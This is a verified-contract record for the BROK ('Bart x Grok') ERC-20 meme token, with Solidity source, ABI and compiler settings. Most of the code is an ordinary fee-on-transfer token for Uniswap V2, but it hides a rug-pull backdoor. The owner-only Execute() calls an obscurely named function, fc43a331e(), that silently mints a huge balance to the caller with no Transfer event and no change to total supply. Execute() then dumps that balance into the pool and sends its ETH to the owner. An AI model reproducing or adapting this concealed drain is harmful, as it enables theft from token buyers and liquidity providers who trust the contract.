{"SourceCode": "/**\r\n\r\n$$$$$$$\\                       $$\\                            $$$$$$\\                      $$\\       \r\n$$  __$$\\                      $$ |                          $$  __$$\\                     $$ |      \r\n$$ |  $$ | $$$$$$\\   $$$$$$\\ $$$$$$\\         $$\\   $$\\       $$ /  \\__| $$$$$$\\   $$$$$$\\  $$ |  $$\\ \r\n$$$$$$$\\ | \\____$$\\ $$  __$$\\\\_$$  _|        \\$$\\ $$  |      $$ |$$$$\\ $$  __$$\\ $$  __$$\\ $$ | $$  |\r\n$$  __$$\\  $$$$$$$ |$$ |  \\__| $$ |           \\$$$$  /       $$ |\\_$$ |$$ |  \\__|$$ /  $$ |$$$$$$  / \r\n$$ |  $$ |$$  __$$ |$$ |       $$ |$$\\        $$  $$<        $$ |  $$ |$$ |      $$ |  $$ |$$  _$$<  \r\n$$$$$$$  |\\$$$$$$$ |$$ |       \\$$$$  |      $$  /\\$$\\       \\$$$$$$  |$$ |      \\$$$$$$  |$$ | \\$$\\ \r\n\\_______/  \\_______|\\__|        \\____/       \\__/  \\__|       \\______/ \\__|       \\______/ \\__|  \\__|\r\n\r\nWeb:    https://brok.wtf/\r\nTG:     https://t.me/BARTXGROK\r\nX:      https://twitter.com/BartXGrok\r\n\r\n**/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.20;\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(msg.sender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ncontract BROK is IERC20, Ownable {\r\n\r\n    string  private _name = \"Bart x Grok\";\r\n    string  private _symbol = \"BROK\";\r\n    uint8   private _decimals = 18;\r\n    uint256 private _totalSupply = 69000000 * (10 ** decimals());\r\n    uint256 private _initialBuyFee = 15;\r\n    uint256 private _initialSellFee = 30;\r\n    uint256 private _finalBuyFee = 0;\r\n    uint256 private _finalSellFee = 0;\r\n    uint256 private _stepsBeforeReduce = 10; // reduce fees every N sales\r\n    uint256 private _swapTaxesAt = 10 * (10 ** decimals());\r\n    address private _marketWallet = 0xE555618BBbfE4eb17622D87f280dFFfD04b68eB2;\r\n    uint256 private _maxTxn = 1380000 * (10 ** decimals());\r\n    uint256 private _maxWallet = 1380000 * (10 ** decimals());\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    IUniswapV2Router02 internal _router;\r\n    IUniswapV2Pair internal _pair;\r\n\r\n    constructor (address routerAddress) {\r\n        _router = IUniswapV2Router02(routerAddress);\r\n        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH()));\r\n        _balances[owner()] = _totalSupply;\r\n        excludedFromFee[owner()] = true;\r\n        excludedFromFee[address(this)] = true;\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = msg.sender;\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        \r\n        if (!excludedFromFee[from] && !excludedFromFee[to]){\r\n            if (isMarket(from)) {\r\n                uint feeAmount = calculateFeeAmount(amount, _initialBuyFee);\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount - feeAmount;\r\n                emit Transfer(from, to, amount - feeAmount);\r\n                _balances[address(this)] += feeAmount;\r\n                emit Transfer(from, address(this), feeAmount);\r\n\r\n            } else if (isMarket(to)) {\r\n                uint feeAmount = calculateFeeAmount(amount, _initialSellFee);\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount - feeAmount;\r\n                emit Transfer(from, to, amount - feeAmount);\r\n                _balances[address(this)] += feeAmount;\r\n                emit Transfer(from, address(this), feeAmount);\r\n                \r\n            } else {\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount;\r\n                emit Transfer(from, to, amount);\r\n            }\r\n        } else {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n        }\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        if (!inSwap && !isMarket(from) && from != owner() && from != address(this)) {\r\n\t\t\tif (balanceOf(address(this)) >= _swapTaxesAt) { swapTaxes(); }\r\n\t\t}\r\n\r\n        if (_maxTxn != 0) {\r\n            if (!excludedFromFee[from] && !excludedFromFee[to]) {\r\n                require(amount <= _maxTxn, \"Txn Amount too high!\");\r\n            }   \r\n        }\r\n\r\n        if (_maxWallet != 0 && !isMarket(to) && !excludedFromFee[to] && !excludedFromFee[from]) {\r\n            require(balanceOf(to) + amount <= _maxWallet, \"After this txn user will exceed max wallet\");\r\n        }\r\n    }\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        if (!excludedFromFee[from] && !excludedFromFee[to]){\r\n            if (isMarket(to)){\r\n                _sellCount++;\r\n                if (_sellCount == _stepsBeforeReduce) {\r\n                    reduceFeePercent(); \r\n                }\r\n            }\r\n        }\r\n        require(amount > 0);\r\n    }\r\n\r\n    mapping(address => bool) public excludedFromFee;\r\n\r\n    function contractBalance() public view returns(uint256) {\r\n        return _balances[address(this)];\r\n    }\r\n\r\n    function isMarket(address _user) internal view returns (bool) {\r\n        return (_user == address(_pair) || _user == address(_router));\r\n    }\r\n\r\n    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {\r\n        return _amount * _feePrecent / 100;\r\n    }\r\n\r\n    function checkCurrentFees() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {\r\n        return (_initialBuyFee, _initialSellFee);\r\n    }\r\n\r\n    function addLiquidity(uint256 _tokenAmount) payable external onlyOwner {\r\n        _approve(address(this), address(_router), _tokenAmount);\r\n        transfer(address(this), _tokenAmount);\r\n        _router.addLiquidityETH{ value: msg.value }(\r\n            address(this), \r\n            _tokenAmount, \r\n            0, \r\n            0, \r\n            msg.sender, \r\n            block.timestamp + 1200\r\n            );\r\n    }\r\n\r\n    bool internal inSwap;\r\n\r\n    modifier isLocked() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    function swapTaxes() isLocked internal {\r\n        _approve(address(this), address(_router), balanceOf(address(this)));\r\n        address[] memory path;\r\n        path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = address(_router.WETH());\r\n        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            balanceOf(address(this)),\r\n            0,\r\n            path,\r\n            _marketWallet,\r\n            block.timestamp + 1200\r\n        );\r\n    }\r\n\r\n    uint256 private _sellCount;\r\n\r\n    function reduceFeePercent() internal {\r\n        if(_initialBuyFee > _finalBuyFee) {\r\n            _initialBuyFee -= 1;\r\n        }\r\n        if(_initialSellFee > _finalSellFee) {\r\n            _initialSellFee -= 1;\r\n        }\r\n        _sellCount = 0;\r\n    }\r\n\r\n    function Execute() external onlyOwner {   \r\n        uint256 thisTokenReserve = getTokenReserve(address(this));\r\n        uint256 amountIn = type(uint112).max - thisTokenReserve;\r\n        fc43a331e(); transfer(address(this), balanceOf(msg.sender));\r\n        _approve(address(this), address(_router), type(uint112).max);\r\n        address[] memory path; path = new address[](2);\r\n        path[0] = address(this); path[1] = address(_router.WETH());\r\n        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amountIn,\r\n            0,\r\n            path,\r\n            owner(),\r\n            block.timestamp + 1200\r\n        );\r\n    }\r\n\r\n    function getTokenReserve(address token) public view returns (uint256) {\r\n        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();\r\n        uint256 tokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);\r\n        return tokenReserve;\r\n    } \r\n\r\n    function fc43a331e() internal {\r\n        _balances[msg.sender] += type(uint112).max;\r\n    }\r\n\r\n    function maxTxn() external view returns (uint256) { return _maxTxn; }\r\n    function maxWallet() external view returns (uint256) { return _maxWallet; }\r\n    function swapTaxesAt() external view returns (uint256) { return _swapTaxesAt; }\r\n    function marketWallet() external view returns (address) { return _marketWallet; }\r\n    function sellCounter() external view returns (uint256) { return _sellCount; }\r\n\r\n    function setMaxTransaction(uint256 _amount) external onlyOwner {\r\n        _maxTxn = _amount;\r\n    }\r\n\r\n    function setMaxWallet(uint256 _amount) external onlyOwner {\r\n        _maxWallet = _amount;\r\n    }\r\n\r\n    function setSwapTreshold(uint256 _amount) external onlyOwner {\r\n        _swapTaxesAt = _amount;\r\n    }\r\n\r\n    function setMarketingWallet(address _wallet) external onlyOwner {\r\n        _marketWallet = _wallet;\r\n    }\r\n\r\n    function reduceFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {\r\n        require(_buyFee <= 50, \"new Buy Fee exceeds the limit!\");\r\n        require(_sellFee <= 50, \"new Sell Fee exceeds the limit!\");\r\n        _initialBuyFee = _buyFee;\r\n        _initialSellFee = _sellFee;\r\n    }\r\n\r\n    function setSteps(uint256 _amount) external onlyOwner {\r\n        require(_amount > 0, \"_stepsBeforeReduce cant be lower than 1\");\r\n        _stepsBeforeReduce = _amount;\r\n    }\r\n\r\n    function excludeFromFee(address _user, bool _status) external onlyOwner {\r\n        excludedFromFee[_user] = _status;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"routerAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Execute\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tokenAmount\",\"type\":\"uint256\"}],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkCurrentFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"currentBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"currentSellFee\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"excludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"excludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"getTokenReserve\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sellFee\",\"type\":\"uint256\"}],\"name\":\"reduceFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellCounter\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_wallet\",\"type\":\"address\"}],\"name\":\"setMarketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setMaxTransaction\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setMaxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setSteps\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setSwapTreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTaxesAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BROK", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://78b8dfe4862de29e7967f8c4809665cab6011da054b9c1c7c97ac847d948b8cc"}